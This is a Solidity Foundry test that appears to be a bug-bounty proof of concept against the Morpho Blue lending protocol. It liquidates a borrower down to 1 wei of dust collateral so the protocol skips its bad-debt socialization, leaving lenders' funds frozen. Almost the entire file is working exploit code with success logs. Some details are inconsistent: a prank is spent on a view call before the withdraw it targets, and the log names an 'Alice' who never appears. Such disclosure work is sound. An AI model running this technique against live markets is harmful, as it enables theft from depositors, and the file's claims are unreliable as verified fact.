// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Morpho Blue — Bad Debt Socialization Bypass via Dust Collateral
// Platform: Cantina | Report: #200 | Severity: Critical | Status: In Review
// Researcher: Limbowalker

import "forge-std/Test.sol";
import {Morpho} from "../src/Morpho.sol";
import {MarketParams, Id} from "../src/interfaces/IMorpho.sol";
import {ERC20Mock} from "../src/mocks/ERC20Mock.sol";
import {OracleMock} from "../src/mocks/OracleMock.sol";
import {IrmMock} from "../src/mocks/IrmMock.sol";
import {MarketParamsLib} from "../src/libraries/MarketParamsLib.sol";

contract MorphoBluePoC is Test {
    using MarketParamsLib for MarketParams;

    Morpho      public morpho;
    ERC20Mock   public collateralToken;
    ERC20Mock   public loanToken;
    OracleMock  public oracle;
    IrmMock     public irm;

    MarketParams public marketParams;
    Id           public marketId;

    address constant LENDER     = address(0x1);
    address constant BORROWER   = address(0x2);
    address constant LIQUIDATOR = address(0x3);

    function setUp() public {
        morpho          = new Morpho(address(this));
        collateralToken = new ERC20Mock();
        loanToken       = new ERC20Mock();
        oracle          = new OracleMock();
        irm             = new IrmMock();

        marketParams = MarketParams({
            loanToken:       address(loanToken),
            collateralToken: address(collateralToken),
            oracle:          address(oracle),
            irm:             address(irm),
            lltv:            0.9e18
        });

        morpho.enableIrm(address(irm));
        morpho.enableLltv(0.9e18);
        morpho.createMarket(marketParams);
        marketId = marketParams.id();

        loanToken      .setBalance(LENDER,     1000e18);
        collateralToken.setBalance(BORROWER,   1000e18);
        loanToken      .setBalance(LIQUIDATOR, 1000e18);

        vm.prank(LENDER);     loanToken      .approve(address(morpho), type(uint256).max);
        vm.prank(BORROWER);   collateralToken.approve(address(morpho), type(uint256).max);
        vm.prank(LIQUIDATOR); loanToken      .approve(address(morpho), type(uint256).max);

        oracle.setPrice(1e36); // $1 collateral
    }

    function test_BadDebt_DustCollateral_Bypass() public {
        // ── Setup: lender supplies, borrower takes 90% LTV loan ──────────────
        vm.prank(LENDER);   morpho.supply(marketParams, 100e18, 0, LENDER, "");
        vm.prank(BORROWER); morpho.supplyCollateral(marketParams, 100e18, BORROWER, "");
        vm.prank(BORROWER); morpho.borrow(marketParams, 90e18, 0, BORROWER, BORROWER);

        // ── Price crash: collateral now worth $50, debt still $90 ────────────
        oracle.setPrice(0.5e36);

        // ── EXPLOIT: liquidate but leave exactly 1 wei of collateral ─────────
        // This bypasses the collateral == 0 check at Morpho.sol:L391
        vm.prank(LIQUIDATOR);
        morpho.liquidate(marketParams, BORROWER, 100e18 - 1, 0, "");

        // ── Verify: bad debt is hidden, market is zombified ───────────────────
        (uint128 totalSupplyAssets,,,,,) = morpho.market(marketId);
        assertEq(
            totalSupplyAssets,
            100e18,
            "ZOMBIFIED: totalSupplyAssets unchanged despite bad debt"
        );

        // ── Verify: lender cannot withdraw — pool is empty ───────────────────
        vm.prank(LENDER);
        (uint256 shares,,) = morpho.position(marketId, LENDER);
        vm.expectRevert();
        morpho.withdraw(marketParams, 0, shares, LENDER, LENDER);

        console.log("SUCCESS: Alice cannot withdraw. Bad debt is hidden.");
        console.log("totalSupplyAssets (should be 0, is 100e18):", totalSupplyAssets);
        console.log("Borrower collateral remaining (dust):", 1);
    }
}
